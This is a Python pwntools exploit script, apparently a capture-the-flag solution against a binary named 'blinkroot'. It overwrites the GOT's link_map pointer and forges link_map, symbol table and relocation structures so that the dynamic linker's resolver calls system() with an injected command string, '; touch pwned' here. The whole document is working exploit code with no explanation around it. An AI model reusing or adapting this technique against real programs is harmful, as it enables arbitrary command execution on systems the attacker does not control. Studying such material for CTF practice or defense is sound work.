from pwn import *

context.arch = "amd64"

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
bin = ELF("./blinkroot")

offset_system = libc.symbols['system']
offset_read = libc.symbols['read']
offset_system -= offset_read; # Offset of system from read

DATA_ADDR = bin.symbols["data"]
LOAD_ADDRESS = offset_system
LINKMAP_ADDR = DATA_ADDR + 0x10
STRTAB_OFFSET = 0x180
STRTAB_ADDR = LINKMAP_ADDR + STRTAB_OFFSET
SYMTAB_OFFSET = 0x100
SYMTAB_ADDR = LINKMAP_ADDR + SYMTAB_OFFSET
RELOC_OFFSET = 0x140
RELOC_ADDR = LINKMAP_ADDR + RELOC_OFFSET

PUTS_RELOC_INDEX = 1

OVERWRITE_ADDRESS = 0x600B48 # Where link_map ptr is stored in GOT
OVERWRITE_VALUE = LINKMAP_ADDR # The prev 8 bytes will be 0x10
PAYLOAD_LEN = 0x400

COMMAND = "; touch pwned"

conn = process("./blinkroot")
#gdb.attach(conn)

## Internal structures

linkmap = ""
linkmap += p64(LOAD_ADDRESS, sign='signed')
linkmap += COMMAND.ljust(0x60, "\x00")
linkmap += p64(STRTAB_ADDR) # Some valid address so that d_ptr can be retrieved
linkmap += p64(SYMTAB_ADDR)
linkmap += p64(0)*16
linkmap += p64(RELOC_ADDR)
linkmap = linkmap.ljust(SYMTAB_OFFSET, "\x00")

symtab = ""
symtab += p64(0) # Tag
symtab += p64(bin.got['read'] - 8) # So sym->st_value points to 'read' in GOT
symtab += p64(0)
symtab = symtab.ljust(RELOC_OFFSET - SYMTAB_OFFSET, "\x00")

reloc = ""
reloc += p64(0) # Tag
reloc += p64(RELOC_ADDR + 0x10 - PUTS_RELOC_INDEX *0x18) # PTR to relocation table
# Relocation entry
reloc += p64(bin.symbols['data'] - offset_system) # Some random address with write access
reloc += p64(7) # type = JMP_REL and symbol table index = 0, points to first entry in our crafted symbol table, i.e. read
# Padding
reloc = reloc.ljust(STRTAB_OFFSET - RELOC_OFFSET, "\x00")

payload = p64(OVERWRITE_ADDRESS - DATA_ADDR - 0x8, sign="signed")
payload += p64(OVERWRITE_VALUE)
payload += linkmap + symtab + reloc
payload = payload.ljust(PAYLOAD_LEN, '\x00')

conn.sendline(payload)
conn.interactive()
